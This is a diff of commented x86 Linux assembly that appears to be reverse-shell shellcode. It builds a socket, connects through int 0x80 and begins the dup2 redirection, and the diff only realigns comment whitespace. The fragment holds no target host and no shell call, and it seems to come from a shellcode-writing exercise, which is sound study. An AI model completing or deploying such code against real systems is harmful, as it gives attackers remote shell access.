@@ -63,7 +63,7 @@ socket:
 	; change edi against eax, eax has now the
 	; return value of socket() and edi has the
 	; last value from top of the stack (0x02).
-	xchg edi, eax       ; change edi against eax
+	xchg edi, eax          ; change edi against eax
 
 	; ebx has now the the value: 0x02
 	xchg ebx, eax          ; change ebx against eax
@@ -86,16 +86,16 @@ connect:
 	;  ebx              \________ esp ________/
 	;                              |
 	;                             ecx
-	inc ebx                 ; increment the ebx to 0x03
-	push STRUCT_LEN         ; STRUCT_LEN = 0x10 (16 byte)
-	push ecx                ; the struct which is stored in ecx
-	push edi                ; push the sockfd on the stack
-	mov ecx, esp            ; save pointer to ecx
+	inc ebx                ; increment the ebx to 0x03
+	push STRUCT_LEN        ; STRUCT_LEN = 0x10 (16 byte)
+	push ecx               ; the struct which is stored in ecx
+	push edi               ; push the sockfd on the stack
+	mov ecx, esp           ; save pointer to ecx
 
-	int 0x80                ; syscall connect()
+	int 0x80               ; syscall connect()
 
 	; we use the fact that the ebx register is even 0x02.
-	mov ecx, ebx            ; use the ebx value: 0x03
+	mov ecx, ebx           ; use the ebx value: 0x03
 dup2:
 	; dup2(oldfd, newfd);
 	;  |     |      |
